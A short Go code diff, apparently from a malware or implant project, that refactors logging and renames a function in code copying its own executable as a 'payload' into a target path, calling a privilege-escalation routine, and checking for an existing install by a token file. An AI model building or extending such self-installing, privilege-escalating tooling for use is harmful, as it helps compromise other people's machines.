@@ -20,10 +20,9 @@ func SetupDaemon() {
 
 func installExecuteable() error {
 	if err := os.RemoveAll(Path); err != nil {
-		log.Println("[InstallExe] [!] Could NOT remove old executeable: ", err)
+		log.Println("[InstallExe] [!] Could NOT clear executeable path: ", err)
 		return err
 	}
-	log.Println("[InstallExe] Removed old executeable before install")
 
 	ex, err := os.Executable()
 	if err != nil {
@@ -57,18 +56,15 @@ func Elevate() error {
 	err := installExecuteable()
 	if err != nil {
 		return errors.New("[Elevate] [!] Could NOT copy payload into target path")
-	} else {
-		log.Println("[Elevate] [+] Successfully copied payload into target path")
 	}
+	log.Println("[Elevate] [+] Successfully copied payload into target path")
 
 	// Escalate exe and return
 	return escalate.Escalate(PathExe)
 }
 
 // CheckSetup check wheter already configured
-func CheckExisting() bool {
-	log.Println("[CheckExisting] Am I the existing install?")
-
+func CheckExistingInstall() bool {
 	osexe, _ := os.Executable()
 	if osexe == PathExe {
 		_, err := os.Stat(filepath.Join(Path, "token"))
